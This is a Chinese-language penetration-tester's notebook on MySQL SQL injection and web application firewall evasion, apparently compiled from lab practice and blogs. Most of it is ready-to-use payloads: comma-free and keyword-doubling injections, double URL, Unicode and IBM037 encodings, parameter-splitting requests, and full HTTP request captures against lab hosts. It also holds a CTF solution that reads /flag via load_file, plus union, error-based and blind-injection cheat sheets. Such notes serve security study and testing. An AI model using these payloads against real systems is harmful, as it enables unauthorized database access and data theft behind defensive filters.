<img src="图片\Snipaste_2023-02-01_23-18-26.png" alt="Snipaste_2023-02-01_23-18-26" style="zoom:80%;" />

## 去重复绕过

在 mysql 查询可以使用 distinct 去除查询的重复值，可以利用这点突破 waf 拦截 

```
select * from users where id=-1 union distinct select 1,2,3,4 from users; 
select * from users where id=-1 union distinct select 1,2,3,version() from users;
```

<img src="图片\Snipaste_2023-02-01_23-25-41.png" alt="Snipaste_2023-02-01_23-25-41" style="zoom:80%;" />

## 反引号绕过

在 mysql 可以使用 `这里是反引号` 绕过一些 waf 拦截。字段可以加反引号或者不加，意义相同

```
insert into users(username,password,email)values('moonsec','123456','admin@moonsec.com'); 

insert into users(`username`,`password`,`email`)values('moonsec','123456','admin@moonsec.com');
```

## 脚本语言特性绕过

在 php 语言中 id=1&id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截 

```
id=1%00&id=2 union select 1,2,3
```

 有些 waf 回去匹配第一个 id 参数 1%00 %00 是截断字符，waf 会自动截断 从而不会检测后面的内容。到了程序中 id 就是等于

```
id=2 union select 1,2,3 
```

从绕过注入拦截。 其他语言特性

<img src="图片\Snipaste_2023-02-01_23-28-11.png" alt="Snipaste_2023-02-01_23-28-11" style="zoom:80%;" />

## 逗号绕过

目前有些防注入脚本都会逗号进行拦截，例如常规注入中必须包含逗号

```
select * from users where id=1 union select 1,2,3,4;
```

<img src="图片\Snipaste_2023-02-01_23-30-13.png" alt="Snipaste_2023-02-01_23-30-13" style="zoom:80%;" />

一般会对逗号过滤成空 select * from users where id=1 union select 1 2 3 4;这样SQL 语句就会出错。所以 可以不使用逗号进行 SQL 注入。 绕过方法如下

### substr 截取字符串

查询当前库第一个字符

```
select(substr(database() from 1 for 1)); 
```

查询 m 等于 select(substr(database() from 1 for 1))  页面返回正常

```
select * from users where id=1 and 'm'=(select(substr(database() from 1 for 1))); 
```

可以进一步优化 m 换成 hex 0x6D 这样就避免了单引号

```
select * from users where id=1 and 0x6D=(select(substr(database() from 1 for 1)));
```

<img src="图片\Snipaste_2023-02-01_23-35-11.png" alt="Snipaste_2023-02-01_23-35-11" style="zoom:80%;" />

### min 截取字符串

这个 min 函数跟 substr 函数功能相同，如果 substr 函数被拦截或者过滤可以使用这个函数代替

```
select mid(database() from 1 for 1);
select * from users where id=1 and 'm'=(select(mid(database() from 1 for 1)));
select * from users where id=1 and 0x6D=(select(mid(database() from 1 for 1)));
```

### 使用 join 绕过

使用 join 自连接两个表

```
union select 1,2    # 等价于 union select * from (select 1)a join (select 2)b
```

a 和 b 分别是表的别名

```
select * from users where id=-1 union select 1,2,3,4; 

select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select 3)c join(select 4)d; 

select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select user())c join(select 4)d;
```

<img src="图片\Snipaste_2023-02-01_23-40-00.png" alt="Snipaste_2023-02-01_23-40-00" style="zoom:80%;" />

可以看到这里也没有使用逗号，从而绕过 waf 对逗号的拦截

使用 like 模糊查询 `select user() like '%r%';`  模糊查询成功返回 1 否则返回 0

<img src="图片\Snipaste_2023-02-01_23-41-04.png" alt="Snipaste_2023-02-01_23-41-04" style="zoom:80%;" />

找到第一个字符后继续进行下一个字符匹配。从而找到所有的字符串 最后就是要查询的内容，这种SQL 注入语句也不会存在逗号。从而绕过 waf 拦截

### limit offset 绕过

SQL 注入时，如果需要限定条目可以使用 limit 0,1 ，限定返回条目的数目 limit 0,1 返回条一条记录如果对逗号进行拦截时，可以使用 **limit 1** **默认返回第一条数据**。也可以使用 **limit 1 offset 0** 从零开始返回第一条记录，这样就绕过 waf 拦截了

<img src="图片\Snipaste_2023-02-01_23-44-56.png" alt="Snipaste_2023-02-01_23-44-56" style="zoom:80%;" />



## or and xor not 绕过

目前主流的 waf 都会对 `id=1 and 1=2`、`id=1 or 1=2`、`id=0 or 1=2 id=0 xor 1=1 limit 1` 、`id=1 xor 1=2` 对这些常见的 SQL 注入检测语句进行拦截

像 and 这些还有字符代替，字符如下

```
and 等于&& 
or 等于 || 
not 等于 ! 
xor 等于|

// 所以可以转换成这样 

id=1 and 1=1 等于 id=1 && 1=1 
id=1 and 1=2 等于 id=1 && 1=2 
id=1 or 1=1 等于 id=1 || 1=1 
id=0 or 1=0 等于 id=0 || 1=0
```

<img src="图片\Snipaste_2023-02-01_23-52-33.png" alt="Snipaste_2023-02-01_23-52-33" style="zoom:80%;" />

<img src="图片\Snipaste_2023-02-01_23-52-48.png" alt="Snipaste_2023-02-01_23-52-48" style="zoom:80%;" />

可以绕过一些 waf 拦截继续对注入点进行安全检测，也可以使用运算符号 

```
id=1 && 2=1+1 
id=1 && 2=1-1
```

<img src="图片\Snipaste_2023-02-01_23-53-58.png" alt="Snipaste_2023-02-01_23-53-58" style="zoom:80%;" />

## ascii 字符对比绕过

许多 waf 会对 `union select` 进行拦截 而且通常比较变态，那么可以**不使用联合查询注入，可以使用字符截取对比法**，进行突破

```
select substring(user(),1,1);
select * from users where id=1 and substring(user(),1,1)='r';
select * from users where id=1 and ascii(substring(user(),1,1))=114;
```

<img src="图片\Snipaste_2023-02-01_23-55-07.png" alt="Snipaste_2023-02-01_23-55-07" style="zoom:80%;" />

最好把 'r' 换成成 ascii 码，如果开启 gpc int 注入就不能用了

可以看到构造得 SQL 攻击语句没有使用联合查询 (union select) 也可以把数据查询出来

## 等号绕过

如果程序会对=进行拦截，可以使用 like rlike regexp 或者使用 <或者>

```
select * from users where id=1 and ascii(substring(user(),1,1))<115; 
select * from users where id=1 and ascii(substring(user(),1,1))>115;
```

<img src="图片\Snipaste_2023-02-02_10-01-04.png" alt="Snipaste_2023-02-02_10-01-04" style="zoom:80%;" />

```sql
select * from users where id=1 and (select substring(user(),1,1)like 'r%');
select * from users where id=1 and (select substring(user(),1,1)rlike 'r');
```

<img src="图片\Snipaste_2023-02-02_10-02-26.png" alt="Snipaste_2023-02-02_10-02-26" style="zoom:80%;" />

```sql
select * from users where id=1 and 1=(select user() regexp '^r'); 
select * from users where id=1 and 1=(select user() regexp '^a');
```

regexp 后面是正则

<img src="图片\Snipaste_2023-02-02_10-03-53.png" alt="Snipaste_2023-02-02_10-03-53" style="zoom:80%;" />

## 双关键词绕过

有些程序会对单词 union、 select  **进行转空** ，但是只会转一次这样会留下安全隐患。 双关键字绕过（若删除掉第一个匹配的 union 就能绕过）

```
id=-1'UNIunionONSeLselectECT1,2,3--+
```

到数据库里执行会变成 

```
id=-1'UNION SeLECT1,2,3--+
```

 从而绕过注入拦截

## 二次编码绕过

有些程序会**解析二次编码**，造成 SQL 注入，因为 url 两次编码过后，waf 是不会拦截的

```
-1 union select 1,2,3,4#
```

第一次转码

```
%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23
```

第二次转码

```
%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%2
5%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%
33%33%25%32%63%25%33%34%25%32%33
```

二次编码注入漏洞分析，在源代码中已经开启了 gpc 对特殊字符进行转义

<img src="图片\Snipaste_2023-02-02_10-07-49.png" alt="Snipaste_2023-02-02_10-07-49" style="zoom:80%;" />

<img src="图片\Snipaste_2023-02-02_10-08-06.png" alt="Snipaste_2023-02-02_10-08-06" style="zoom:80%;" />

代码里有 **urldecode()** 这个函数是对字符 url 解码，因为两次编码 GPC 是不会过滤的，所以可以绕过gpc 字符转义，这样也就绕过了 waf 的拦截。二次解码是浏览器解一次，后端代码又解了一次



<img src="图片\Snipaste_2023-02-02_10-09-45.png" alt="Snipaste_2023-02-02_10-09-45" style="zoom:80%;" />

## 多参数拆分绕过

多余多个参数拼接到同一条 SQL 语句中，可以将注入语句分割插入

例如请求 get 参数，a=[input1]&b=[input2] 可以将参数 a 和 b 拼接在 SQL 语句中

在程序代码中看到两个可控的参数，但是使用 union select 会被 waf 拦截

<img src="图片\Snipaste_2023-02-02_10-11-40.png" alt="Snipaste_2023-02-02_10-11-40" style="zoom:80%;" />

那么可以使用参数拆份请求绕过 waf 拦截

```
-1'union/*&username=*/select 1,user(),3,4--+
```

<img src="图片\Snipaste_2023-02-02_10-12-48.png" alt="Snipaste_2023-02-02_10-12-48" style="zoom:80%;" />

**两个参数的值可以控，分解 SQL 注入关键字**，可以组合一些 SQL 注入语句突破 waf 拦截

## 使用生僻函数绕过

使用生僻函数替代常见的函数，例如在报错注入中使用 **polygon()** 函数替换常用的 **updatexml()** 函数

```
select polygon((select * from (select * from (select @@version) f) x));
```

## 信任白名单绕过

有些 WAF 会自带一些文件白名单，对于白名单 waf 不会拦截任何操作，所以可以利用这个特点，可以试试白名单绕过

白名单通常有目录

```
/admin 
/phpmyadmin 
/admin.php

 http://192.168.0.115/06/vul/sqli/sqli_str.php?a=/admin.php&name=vince+&submit=1
 http://192.168.0.165/06/vul/sqli/sqli_str.php/phpmyadmin?name=%27%20union%20select%201,user() --+&submit=1
```

<img src="图片\Snipaste_2023-02-02_10-17-55.png" alt="Snipaste_2023-02-02_10-17-55" style="zoom:80%;" />

## 静态文件绕过

除了白名单信任文件和目录外，还有一部分 waf 并不会对静态文件进行拦截。 例如 图片文件 jpg 、png 、gif 或者 css 、js 会对这些静态文件的操作不会进行检测从而绕过waf 拦截

```
/1.jpg&name=vince+&submit=1 
/1.jpg=/1.jpg&name=vince+&submit=1 
/1.css=/1.css&name=vince+&submit=1
```

<img src="图片\Snipaste_2023-02-02_10-19-38.png" alt="Snipaste_2023-02-02_10-19-38" style="zoom:80%;" />

## order by 绕过

当 order by 被过滤时，无法猜解字段数，此时可以使用 into 变量名进行代替

```
select * from users where id=1 into @a,@b,@c,@d;
```

<img src="图片\Snipaste_2023-02-02_10-21-09.png" alt="Snipaste_2023-02-02_10-21-09" style="zoom:80%;" />

## http 相同参数请求绕过

waf 在对危险字符进行检测的时候，分别为 post 请求和 get 请求设定了不同的匹配规则，请求被拦截，变换请求方式有几率能绕过检测。如果程序中能同时接收 get、post 如果 waf 只对 get 进行匹配拦截，没有对 post 进行拦截

```
<?php
echo $_REQUEST['id'];
?>
```

<img src="图片\Snipaste_2023-02-02_10-23-46.png" alt="Snipaste_2023-02-02_10-23-46" style="zoom:80%;" />

有些 waf 只要存在 GET 或者 POST 优先匹配 POST 从而导致被绕过

<img src="图片\Snipaste_2023-02-02_10-24-18.png" alt="Snipaste_2023-02-02_10-24-18" style="zoom:80%;" />

## application/json 或者 text/xml 绕过

有些程序是 **json 提交参数**，程序也是 json 接收再拼接到 SQL 执行 json 格式通常不会被拦截。所以可以绕过 waf

```
........
Content-Type:application/json
Content-Length: 38
Origin: http://192.168.0.115
Connection: close
Referer: http://192.168.0.115/06/vul/sqli/sqli_id.php
Cookie: PHPSESSID=e6sa76lft65q3fd25bilbc49v3; security_level=0
Upgrade-Insecure-Requests: 1

{'id':1 union select 1,2,3,'submit':1}
```

<img src="图片\Snipaste_2023-02-02_10-26-23.png" alt="Snipaste_2023-02-02_10-26-23" style="zoom:80%;" />

同样 text/xml 也不会被拦截

## 运行大量字符绕过

可以使用 select 0xA 运行一些字符从绕突破一些 waf 拦截

```
id=1 and (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/*!union*//*!select*/1,user()
```

post 编码

```
1+and+(select+1)%3d(select+0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/*!union*//*!select*
/1,user()&submit=1
```

<img src="图片\Snipaste_2023-02-02_10-27-50.png" alt="Snipaste_2023-02-02_10-27-50" style="zoom:80%;" />

```
POST /06/vul/sqli/sqli_id.php HTTP/1.1
Host: 192.168.0.165
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 99
Origin: http://192.168.0.165
Connection: close
Referer: http://192.168.0.165/06/vul/sqli/sqli_id.php
Cookie: PHPSESSID=hk8r159en71pndlu3jvvphenn5
Upgrade-Insecure-Requests: 1

id=1+and+(select+1)and+(select+0xA*1000)/*!union*//*!select*/+1,user()--+&submit=%E6%9F%A5%E
8%AF%A2
```

## 花扩号绕过

```
select 1,2 union select{x 1},user()
```

花括号 左边是注释的内容，这样可以一些 waf 的拦截

<img src="图片\Snipaste_2023-02-02_10-29-32.png" alt="Snipaste_2023-02-02_10-29-32" style="zoom:80%;" />

## 使用 ALL 或者 DISTINCT 绕过

去掉重复值

```
select 1,2 from users where user_id=1 union DISTINCT select 1,2
select 1,2 from users where user_id=1 union select DISTINCT 1,2
```

显示全部

```
select 1,2 from users where user_id=1 union all select 1,2
select 1,2 from users where user_id=1 union select all 1,2
```

<img src="图片\Snipaste_2023-02-02_10-30-47.png" alt="Snipaste_2023-02-02_10-30-47" style="zoom:80%;" />

## 换行混绕绕过

目前很多 waf 都会对 union select 进行过滤的 因为使用联合查询 这两个关键词是必须的，一般过滤这个两个字符 想用联合查询就很难了

可以使用换行，加上一些注释符进行绕过

<img src="图片\Snipaste_2023-02-02_10-31-43.png" alt="Snipaste_2023-02-02_10-31-43" style="zoom:80%;" />

<img src="图片\Snipaste_2023-02-02_10-32-19.png" alt="Snipaste_2023-02-02_10-32-19" style="zoom:80%;" />

也可以进行编码

<img src="图片\Snipaste_2023-02-02_10-32-48.png" alt="Snipaste_2023-02-02_10-32-48" style="zoom:80%;" />

## 编码绕过

**原理:形式**：“%”加上 ASCII 码（先将字符转换为两位 ASCII 码，再转为 16 进制），其中加号“+”在URL 编码中和“%20”表示一样，均为空格

当遇到非 ASCII 码表示的字符时，如中文，浏览器或通过编写 URLEncode，根据 UTF-8、GBK 等编码16 进制形式，进行转换。如“春”的 UTF-8 编码为 E6 98 A5，因此其在支持 UTF-8 的情况下，URL 编码为%E6%98%A5。值得注意的是采取不同的中文编码，会有不同的 URL 编码

在 URL 传递到后台时，首先 web 容器会自动先对 URL 进行解析。容器解码时，会根据设置（如jsp 中，会使用 request.setCharacterEncoding("UTF-8")），采用 UTF-8 或 GBK 等其中一种编码进行解析。这时，程序无需自己再次解码，便可以获取参数（如使用 request.getParameter(paramName)）

但是，有时从客户端提交的 URL 无法确定是何种编码，如果服务器选择的编码方式不匹配，则会造成中文乱码。为了解决这个问题，便出现了二次 URLEncode 的方法。在客户端对 URL 进行两次URLEncode，这样类似上文提到的%E6%98%A5 则会编码为%25e6%2598%25a5，为纯 ASCII 码。Web 容器在接到URL 后，自动解析一次，因为不管容器使用何种编码进行解析，都支持 ASCII 码，不会出错。然后在通过编写程序对容器解析后的参数进行解码，便可正确得到参数。在这里，客户端的第一次编码，以及服务端的第二次解码，均是由程序员自己设定的，是可控的，可知的

**绕过**： 有些 waf 并未对参数进行解码，而后面程序处理业务时会进行解码，因此可以通过二次url 编码绕过。例如：

<img src="图片\Snipaste_2023-02-02_10-35-05.png" alt="Snipaste_2023-02-02_10-35-05" style="zoom:80%;" />

除了可以把全部字符转换也可以单独转换字符

## HTTP 数据编码绕过

编码绕过在绕 waf 中也是经常遇到的，通常 waf 只坚持他所识别的编码，比如说它只识别utf-8 的字符，但是服务器可以识别比 utf-8 更多的编码

**那么我们只需要将 payload 按照 waf 识别不了但是服务器可以解析识别的编码格式即可绕过**

比如请求包中我们可以更改 Content-Type 中的 charset 的参数值，我们改为 ibm037 这个协议编码，有些服务器是支持的。payload 改成这个协议格式就行了

```
POST /06/vul/sqli/sqli_id.php HTTP/1.1
Host: 192.168.0.115
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded;charset:ibm037
Content-Length: 33
Connection: close
Cookie: PHPSESSID=e6sa76lft65q3fd25bilbc49v3; security_level=0
Upgrade-Insecure-Requests: 1

%89%84=%F1&%A2%A4%82%94%89%A3=%F1
```

透过 Content-Type 的 charset 绕过 waf#

```
未编码
id=123&pass=pass%3d1

透过 IBM037 编码
%89%84=%F1%F2%F3&%97%81%A2%A2=%97%81%A2%A2~%F1

在提交的 http header
Content-Type: application/x-www-form-urlencoded; charset=ibm037
```

## url 编码绕过

在 iis 里会自动把 url 编码转换成字符串传到程序中执行

例如 union select 可以转换成 u%6eion s%65lect

<img src="图片\Snipaste_2023-02-02_10-38-13.png" alt="Snipaste_2023-02-02_10-38-13" style="zoom:80%;" />

```
POST /06/vul/sqli/sqli_id.php HTTP/1.1
Host: 192.168.0.165
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://192.168.0.165
Connection: close
Referer: http://192.168.0.165/06/vul/sqli/sqli_id.php
Cookie: PHPSESSID=hk8r159en71pndlu3jvvphenn5
Upgrade-Insecure-Requests: 1

id=-1 union%25OAselect%25OA1,user()-- &submit=1
```

## Unicode 编码绕过

```
形式：“\u”或者是“%u”加上 4 位 16 进制 Unicode 码值。
iis 会自动进行识别这种编码 有部分 waf 并不会拦截这这种编码
-1 union select 1,user()
部分转码
-1 uni%u006fn sel%u0065ct 1,user()
全部转码
%u002d%u0031%u0020%u0075%u006e%u0069%u006f%u006e%u0020%u0073%u0065%u006c%u0065%u0063%u0074%u
0020%u0031%u002c%u0075%u0073%u0065%u0072%u0028%u0029
```

## union select 绕过

目前不少 waf 都会使用都会对 union select 进行拦截，单个不拦截，一起就进行拦截

针对单个关键词绕过

```
sel<>ect 程序过滤<>为空 脚本处理
sele/**/ct 程序过滤/**/为空
/*!%53eLEct*/ url 编码与内联注释
se%0blect 使用空格绕过
sele%ct 使用百分号绕过
%53eLEct 编码绕过
大小写与其它
uNIoN sELecT 1,2
union all select 1,2
union DISTINCT select 1,2
null+UNION+SELECT+1,2
/*!union*//*!select*/1,2
union/**/select/**/1,2
and(select 1)=(Select 0xA*1000)/*!uNIOn*//*!SeLECt*/ 1,user()
/*!50000union*//*!50000select*/1,2
/*!40000union*//*!40000select*/1,2
%0aunion%0aselect 1,2
%250aunion%250aselect 1,2
%09union%09select 1,2
%0caunion%0cselect 1,2
%0daunion%0dselect 1,2
%0baunion%0bselect 1,2
%0d%0aunion%0d%0aselect 1,2
--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2
/*!12345union*//*!12345select*/1,2;
/*中文*/union/*中文*/select/*中文*/1,2;
/* */union/* */select/ */1,2;
/*!union*//*!00000all*//*!00000select*/1,2

可以使用 fuzz 尝试
```

# 其它

## ctfshow  web491

[CTFSHOW\]中期测评WP(差512和514)_Y4tacker的博客-CSDN博客](https://blog.csdn.net/solitudi/article/details/115739632?ops_request_misc=&request_id=945ca7dd90a24287830bfe59cbe62b21&biz_id=&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~koosearch~default-12-115739632-null-null.268^v1^control&utm_term=ctfshow&spm=1018.2226.3001.4450)

```http
http://1e6526fd-3805-4ddd-bfca-5ba269c93212.chall.ctf.show:8080/index.php?action=clear
```

```http
http://389af0f6-12b5-448f-8e75-8e3c5c172cd4.chall.ctf.show:8080/index.php?action=check&username=1' union select load_file("/flag") into dumpfile "/tmp/4.php"--+&password=1
```

```http
http://389af0f6-12b5-448f-8e75-8e3c5c172cd4.chall.ctf.show:8080/index.php?action=../../../../../../../../tmp/4
```



# 重要笔记

[SQL 注入 - Mysql | Zer0-hex's Blog (zer0-hex.github.io)](https://zer0-hex.github.io/n3qKmqqFF/)

## SQL 注入 - Mysql

· 2023-04-10 · [# 渗透测试 ](https://zer0-hex.github.io/S_pJMT0Cy/)[# SQL 注入](https://zer0-hex.github.io/9ABIEQaCbY/)

## 0x0 Mysql 基础语句

- 注释

```text
# MYSQL 注释
-- 注释 [两个 - 后面加一个空格]
/* MYSQL 注释 */
/*!32302 10*/ MYSQL 3.23.02 版本的注释
/*! MYSQL 特殊 SQL */
```

- 查询语句

```php
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
$sql="SELECT users.username, users.password FROM users WHERE users.username='$username' and users.password='$password' ORDER BY users.id DESC LIMIT 0,1";
$sql = "SELECT * FROM users ORDER BY $id";
```

- 插入语句

```php
$sql = "insert into users ( username, password) values(\"$username\", \"$pass\")";
```

- 更新语句

```php
$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
```

- 删除语句

```php
$sql = "delete from student where id = $id"
$sql = "delete from student where id in ($id1, $id2, $id3)"
```

## 0x1 基于 Union 的联合注入

> 一般用于查询语句的注入

### 检查列数

> 联合注入需要知道查询语句显示的列数，可以用以下方法去判断

- order by

```text
1' ORDER BY 1--+		#True
1' ORDER BY 2--+		#True
1' ORDER BY 3--+		#True
1' ORDER BY 4--+		#False - 可以判断，被注入语句查询结果有三列
-1' UNION SELECT 1,2,3--+	# True
```

- group by

```text
1' GROUP BY 1--+		#True
1' GROUP BY 2--+		#True
1' GROUP BY 3--+		#True
1' GROUP BY 4--+		#False - 可以判断，被注入语句查询结果有三列
-1' UNION SELECT 1,2,3--+	# True
```

#### 如果目标启用了错误显示

> 如果页面返回错误信息，可以构造语句让其显示语法错误，一般会显示需要的信息

- order by 报错

```text
1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+

# 如果提示：Unknown column '4' in 'order clause'
# 说明第 4 列不存在，那么得知只有三列。
# -1' UNION SELECT 1,2,3--+	# True
```

- group by 报错

```text
1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+

# 如果提示：Unknown column '4' in 'group statement'
# 说明第 4 列不存在，那么得知只有三列。
# -1' UNION SELECT 1,2,3--+	# True
```

- union select 报错

```text
1' UNION SELECT @--+        	# 报错: The used SELECT statements have a different number of columns
1' UNION SELECT @,@--+      	# 报错: The used SELECT statements have a different number of columns
1' UNION SELECT @,@,@--+    	# 无报错，说明有 3 列
-1' UNION SELECT 1,2,3--+	# True
```

- limit into

```text
1' LIMIT 1,1 INTO @--+        	# 报错: The used SELECT statements have a different number of columns
1' LIMIT 1,1 INTO @,@--+      	# 报错: The used SELECT statements have a different number of columns
1' LIMIT 1,1 INTO @,@,@--+    	# 无报错，说明有 3 列
-1' UNION SELECT 1,2,3--+	# True
```

- select * from any_table

```text
1' AND (SELECT * FROM Users) = 1--+ 	
# (select * from users) 会返回 users 表的列数，通过逻辑判断
# 如果错误信息中包含：means query uses 3 column
-1' UNION SELECT 1,2,3--+	# True
```

### 获取数据

#### 有 information_schema

> 也可以 union all select，# 加上 all 可以显示所有结果，包括重复行。

```text
# 数据库
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
# 表
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
# 字段
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
# 数据
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```

#### 无 information_schema

- 版本: Mysql >= 4.1

```text
# 首先获取字段数
?id=(1)and(SELECT * from db.users)=(1)
-- 报错：Operand should contain 4 column(s)

# 然后提取字段
?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
-- 报错：Column 'id' cannot be null
```

- 版本 Mysql = 5

```text
# 获取字段名
-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a
-- #1060 - Duplicate column name 'id'

-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a
-- #1060 - Duplicate column name 'name'

-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a
...
```

### 无字段名提取数据

- 获取第 4 列数据

```text
select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;
```

- 查询内注入

```text
select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);
```

## 基于错误回显的报错注入

> 报错信息长度有限

### 基本的报错

- 版本: Mysql >= 4.1

```text
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
```

### UpdateXML 函数报错

```text
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

- 短一点的 Payload

```sql
' and updatexml(null,concat(0x0a,version()),null)-- -
' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```

### Extractvalue 函数报错

- 版本: Mysql >= 5.1

```text
?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
```

### NAME_CONST 函数报错

> 查询语句的内容必须是常量，也就是确定的值，无法使用通过 SQL 语句得到的值

- 版本 Mysql >= 5.0

```text
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```

## Mysql 布尔盲注

> 通过观察页面是否发生变化来判断

- 通过字符串比较

```text
?id=1 and substring(version(),1,1)=5
?id=1 and right(left(version(),1),1)=5
?id=1 and left(version(),1)=4
?id=1 and ascii(lower(substr(Version(),1,1)))=51
?id=1 and (select mid(version(),1,1)=4)
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
```

- order by & 正则表达式 & then

```text
[...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP "^[BRUTEFORCE CHAR BY CHAR].*" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -
```

- then & 正则表达式

```text
' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -

# SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -';
```

- if 条件盲注

```text
2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
Response:	# 
